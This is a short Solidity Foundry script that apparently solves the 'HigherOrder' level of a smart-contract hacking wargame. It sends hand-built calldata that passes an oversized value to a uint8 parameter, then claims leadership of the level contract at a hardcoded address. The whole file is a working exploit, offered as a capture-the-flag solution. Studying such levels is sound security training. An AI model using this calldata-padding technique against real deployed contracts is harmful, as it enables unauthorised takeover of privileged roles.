pragma solidity ^0.8.19;

import {Script, console} from "../lib/forge-std/src/Script.sol";

interface HigherOrder {
    function commander() external returns(address);
    function registerTreasury(uint8) external;
    function claimLeadership() external;
}

contract HigherOrderScript is Script {
    function run() external {
        vm.startBroadcast();

        address levelContractAddress = 0x15D0f408B97EB3e9CcB18cF20e5921e09277A939;
        HigherOrder ho = HigherOrder(levelContractAddress);

        bytes memory _data = abi.encodePacked(HigherOrder.registerTreasury.selector, bytes32(uint256(0xfffff)));
        (bool success, ) = levelContractAddress.call(_data);
        require(success, "registerTreasury failed !");
        ho.claimLeadership();
        require(ho.commander() == msg.sender, "level failed !!");
        vm.stopBroadcast();
    }
}